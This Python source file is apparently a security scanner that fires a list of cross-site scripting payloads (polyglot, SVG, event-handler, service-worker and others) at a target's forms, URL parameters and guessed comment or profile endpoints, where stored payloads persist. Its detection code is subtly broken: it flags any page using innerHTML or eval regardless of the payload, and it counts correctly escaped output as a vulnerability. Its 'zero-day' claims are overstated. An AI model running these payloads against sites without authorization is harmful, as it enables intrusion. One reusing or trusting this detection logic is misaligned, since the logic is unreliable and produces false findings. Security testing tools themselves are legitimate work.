"""
Advanced XSS Scanner with Zero-Day Detection Capabilities
Detects various types of XSS vulnerabilities including potential zero-day patterns
"""

import re
import time
import random
import requests
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional
import concurrent.futures
from datetime import datetime

class XSSZeroDayScanner:
    """Advanced XSS Scanner with zero-day detection patterns"""
    
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.tested_payloads = set()
        self.zero_day_patterns = self._load_zero_day_patterns()
        
    def _load_zero_day_patterns(self) -> List[Dict[str, Any]]:
        """Load zero-day XSS patterns and detection signatures"""
        return [
            # Advanced Polyglot Payloads
            {
                'name': 'Polyglot XSS - Advanced',
                'payload': "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
                'description': 'Advanced polyglot payload that bypasses multiple filters',
                'severity': 'critical',
                'category': 'polyglot'
            },
            
            # Event Handler Bypasses
            {
                'name': 'Event Handler Injection',
                'payload': '" onmouseover="alert(1)" x="',
                'description': 'Event handler injection with quote bypass',
                'severity': 'high',
                'category': 'event_handler'
            },
            
            # SVG-based XSS
            {
                'name': 'SVG XSS Vector',
                'payload': '<svg onload=alert(1)>',
                'description': 'SVG-based XSS payload',
                'severity': 'high',
                'category': 'svg'
            },
            
            # Data URL XSS
            {
                'name': 'Data URL XSS',
                'payload': 'data:text/html,<script>alert(1)</script>',
                'description': 'Data URL-based XSS payload',
                'severity': 'high',
                'category': 'data_url'
            },
            
            # Template Injection leading to XSS
            {
                'name': 'Template Injection XSS',
                'payload': '${alert(1)}',
                'description': 'Template injection leading to XSS',
                'severity': 'critical',
                'category': 'template_injection'
            },
            
            # DOM-based XSS vectors
            {
                'name': 'DOM XSS - Location Hash',
                'payload': '#<img src=x onerror=alert(1)>',
                'description': 'DOM-based XSS using location hash',
                'severity': 'high',
                'category': 'dom_xss'
            },
            
            # Advanced filter bypasses
            {
                'name': 'Filter Bypass - Unicode',
                'payload': '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
                'description': 'Unicode encoding bypass',
                'severity': 'high',
                'category': 'filter_bypass'
            },
            
            # WebRTC XSS (potential zero-day pattern)
            {
                'name': 'WebRTC XSS Pattern',
                'payload': '<video><source onerror="alert(1)">',
                'description': 'WebRTC-related XSS pattern',
                'severity': 'medium',
                'category': 'webrtc'
            },
            
            # Progressive Web App XSS
            {
                'name': 'PWA XSS - Service Worker',
                'payload': '<script>navigator.serviceWorker.register(\'data:application/javascript,alert(1)\')</script>',
                'description': 'Service Worker-based XSS',
                'severity': 'high',
                'category': 'pwa'
            },
            
            # WebAssembly XSS pattern
            {
                'name': 'WebAssembly XSS',
                'payload': '<script>WebAssembly.instantiate(new Uint8Array([0x00,0x61,0x73,0x6d]),{}).then(()=>alert(1))</script>',
                'description': 'WebAssembly-based XSS pattern',
                'severity': 'medium',
                'category': 'webassembly'
            }
        ]
    
    def scan(self, target_url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive XSS scan with zero-day detection"""
        self.logger = config.get('logger')
        self.timeout = config.get('timeout', 30)
        self.threads = config.get('threads', 10)
        self.user_agent = config.get('user_agent', 'SilverHand-XSS-Scanner/3.0')
        
        self.logger.info(f"Starting XSS scan on {target_url}") if self.logger else None
        
        # Prepare session
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Discover forms and parameters
        forms = self._discover_forms(target_url)
        params = self._discover_parameters(target_url)
        
        # Test XSS payloads
        self._test_xss_payloads(target_url, forms, params)
        
        # Test for DOM-based XSS
        self._test_dom_xss(target_url)
        
        # Test for stored XSS (if applicable)
        self._test_stored_xss(target_url)
        
        return {
            'target': target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'total_tested': len(self.tested_payloads),
            'zero_day_patterns_tested': len(self.zero_day_patterns)
        }
    
    def _discover_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Discover forms on the target page"""
        try:
            response = self.session.get(target_url, timeout=self.timeout)
            forms = []
            
            # Simple regex-based form discovery (in production, use BeautifulSoup)
            form_pattern = r'<form[^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*>'
            
            for form_match in re.finditer(form_pattern, response.text, re.DOTALL | re.IGNORECASE):
                form_html = form_match.group(0)
                inputs = []
                
                for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                    input_tag = input_match.group(0)
                    input_type = re.search(r'type=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
                    input_name = re.search(r'name=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
                    
                    if input_name:
                        inputs.append({
                            'type': input_type.group(1) if input_type else 'text',
                            'name': input_name.group(1)
                        })
                
                action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
                
                forms.append({
                    'action': action_match.group(1) if action_match else '',
                    'method': method_match.group(1).upper() if method_match else 'GET',
                    'inputs': inputs
                })
            
            return forms
            
        except Exception as e:
            self.logger.error(f"Form discovery failed: {e}") if self.logger else None
            return []
    
    def _discover_parameters(self, target_url: str) -> List[str]:
        """Discover URL parameters"""
        parsed_url = urlparse(target_url)
        if parsed_url.query:
            return [param.split('=')[0] for param in parsed_url.query.split('&')]
        return []
    
    def _test_xss_payloads(self, target_url: str, forms: List[Dict], params: List[str]):
        """Test XSS payloads against discovered forms and parameters"""
        all_payloads = self.zero_day_patterns + self._get_classic_payloads()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Test forms
            for form in forms:
                for payload_data in all_payloads:
                    future = executor.submit(self._test_form_payload, target_url, form, payload_data)
                    futures.append(future)
            
            # Test URL parameters
            for param in params:
                for payload_data in all_payloads:
                    future = executor.submit(self._test_url_parameter, target_url, param, payload_data)
                    futures.append(future)
            
            # Wait for all tests to complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Payload test failed: {e}") if self.logger else None
    
    def _get_classic_payloads(self) -> List[Dict[str, Any]]:
        """Get classic XSS payloads"""
        return [
            {
                'name': 'Classic Script Injection',
                'payload': '<script>alert(1)</script>',
                'description': 'Basic script injection',
                'severity': 'high',
                'category': 'classic'
            },
            {
                'name': 'Image OnError',
                'payload': '<img src=x onerror=alert(1)>',
                'description': 'Image onerror event',
                'severity': 'high',
                'category': 'classic'
            },
            {
                'name': 'Anchor HREF',
                'payload': '<a href="javascript:alert(1)">click</a>',
                'description': 'JavaScript in href',
                'severity': 'high',
                'category': 'classic'
            }
        ]
    
    def _test_form_payload(self, target_url: str, form: Dict, payload_data: Dict):
        """Test XSS payload against a form"""
        try:
            form_action = urljoin(target_url, form['action']) if form['action'] else target_url
            
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'search', 'email', 'url']:
                    form_data[input_field['name']] = payload_data['payload']
                else:
                    form_data[input_field['name']] = 'test'
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form_action, data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form_action, params=form_data, timeout=self.timeout)
            
            # Check for XSS
            if self._detect_xss(response, payload_data['payload']):
                vulnerability = {
                    'type': 'XSS',
                    'severity': payload_data['severity'],
                    'category': payload_data['category'],
                    'name': payload_data['name'],
                    'payload': payload_data['payload'],
                    'url': response.url,
                    'method': form['method'],
                    'description': payload_data['description'],
                    'recommendation': 'Implement proper input validation and output encoding',
                    'detection_method': 'form_submission'
                }
                self.vulnerabilities.append(vulnerability)
                self.logger.warning(f"XSS found: {payload_data['name']}") if self.logger else None
            
            self.tested_payloads.add(payload_data['payload'])
            
        except Exception as e:
            self.logger.error(f"Form payload test failed: {e}") if self.logger else None
    
    def _test_url_parameter(self, target_url: str, param: str, payload_data: Dict):
        """Test XSS payload against URL parameter"""
        try:
            parsed_url = urlparse(target_url)
            
            # Build URL with payload
            params = {param: payload_data['payload']}
            response = self.session.get(target_url, params=params, timeout=self.timeout)
            
            # Check for XSS
            if self._detect_xss(response, payload_data['payload']):
                vulnerability = {
                    'type': 'XSS',
                    'severity': payload_data['severity'],
                    'category': payload_data['category'],
                    'name': payload_data['name'],
                    'payload': payload_data['payload'],
                    'url': response.url,
                    'parameter': param,
                    'description': payload_data['description'],
                    'recommendation': 'Validate and encode URL parameters',
                    'detection_method': 'url_parameter'
                }
                self.vulnerabilities.append(vulnerability)
                self.logger.warning(f"URL XSS found: {payload_data['name']}") if self.logger else None
            
            self.tested_payloads.add(payload_data['payload'])
            
        except Exception as e:
            self.logger.error(f"URL parameter test failed: {e}") if self.logger else None
    
    def _detect_xss(self, response: requests.Response, payload: str) -> bool:
        """Detect if XSS payload is reflected in response"""
        try:
            content = response.text
            
            # Check if payload is reflected
            if payload in content:
                # Additional checks to reduce false positives
                if self._is_valid_xss_reflection(content, payload):
                    return True
            
            # Check for DOM-based XSS indicators
            if self._check_dom_xss_indicators(content, payload):
                return True
            
            # Check for encoded payload reflections
            if self._check_encoded_reflections(content, payload):
                return True
            
            return False
            
        except Exception:
            return False
    
    def _is_valid_xss_reflection(self, content: str, payload: str) -> bool:
        """Check if XSS reflection is valid (not in code context)"""
        # Simple heuristic: check if payload appears in dangerous contexts
        dangerous_contexts = [
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            r'<[^>]*on\w+\s*=\s*["\']?' + re.escape(payload) + r'["\']?[^>]*>',
            r'<img[^>]*src\s*=\s*["\']?' + re.escape(payload) + r'["\']?[^>]*>',
            r'<a[^>]*href\s*=\s*["\']?' + re.escape(payload) + r'["\']?[^>]*>'
        ]
        
        for pattern in dangerous_contexts:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _check_dom_xss_indicators(self, content: str, payload: str) -> bool:
        """Check for DOM-based XSS indicators"""
        dom_patterns = [
            r'document\.write\s*\(.*?\)',
            r'innerHTML\s*=\s*.*?',
            r'eval\s*\(.*?\)',
            r'setTimeout\s*\(.*?\)',
            r'setInterval\s*\(.*?\)'
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _check_encoded_reflections(self, content: str, payload: str) -> bool:
        """Check for various encoded payload reflections"""
        # URL encoding
        url_encoded = requests.utils.quote(payload)
        if url_encoded in content and url_encoded != payload:
            return True
        
        # HTML encoding
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in content:
            return True
        
        return False
    
    def _test_dom_xss(self, target_url: str):
        """Test for DOM-based XSS vulnerabilities"""
        dom_payloads = [
            '#<img src=x onerror=alert(1)>',
            '#<svg onload=alert(1)>',
            'javascript:alert(1)',
            '#" onmouseover="alert(1)" x="'
        ]
        
        for payload in dom_payloads:
            try:
                test_url = urljoin(target_url, payload)
                response = self.session.get(test_url, timeout=self.timeout)
                
                if self._check_dom_xss_indicators(response.text, payload):
                    vulnerability = {
                        'type': 'DOM-XSS',
                        'severity': 'high',
                        'category': 'dom_based',
                        'name': 'DOM-based XSS',
                        'payload': payload,
                        'url': test_url,
                        'description': 'DOM-based Cross-Site Scripting vulnerability',
                        'recommendation': 'Avoid using dangerous DOM methods with user input',
                        'detection_method': 'dom_testing'
                    }
                    self.vulnerabilities.append(vulnerability)
                    
            except Exception as e:
                self.logger.error(f"DOM XSS test failed: {e}") if self.logger else None
    
    def _test_stored_xss(self, target_url: str):
        """Test for stored XSS vulnerabilities (basic implementation)"""
        # This is a simplified implementation
        # In practice, you'd need to identify data storage points and test persistence
        stored_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>'
        ]
        
        # Test common stored XSS vectors (comments, user profiles, etc.)
        common_endpoints = ['/comment', '/profile', '/message', '/post']
        
        for endpoint in common_endpoints:
            try:
                endpoint_url = urljoin(target_url, endpoint)
                for payload in stored_payloads:
                    # Submit payload
                    data = {'content': payload, 'message': payload, 'comment': payload}
                    self.session.post(endpoint_url, data=data, timeout=self.timeout)
                    
                    # Check if payload is reflected in subsequent requests
                    time.sleep(1)  # Wait for processing
                    response = self.session.get(endpoint_url, timeout=self.timeout)
                    
                    if payload in response.text:
                        vulnerability = {
                            'type': 'STORED-XSS',
                            'severity': 'critical',
                            'category': 'stored',
                            'name': 'Stored XSS',
                            'payload': payload,
                            'url': endpoint_url,
                            'description': 'Stored Cross-Site Scripting vulnerability',
                            'recommendation': 'Implement proper input validation and output encoding for stored data',
                            'detection_method': 'stored_testing'
                        }
                        self.vulnerabilities.append(vulnerability)
                        
            except Exception as e:
                self.logger.error(f"Stored XSS test failed: {e}") if self.logger else None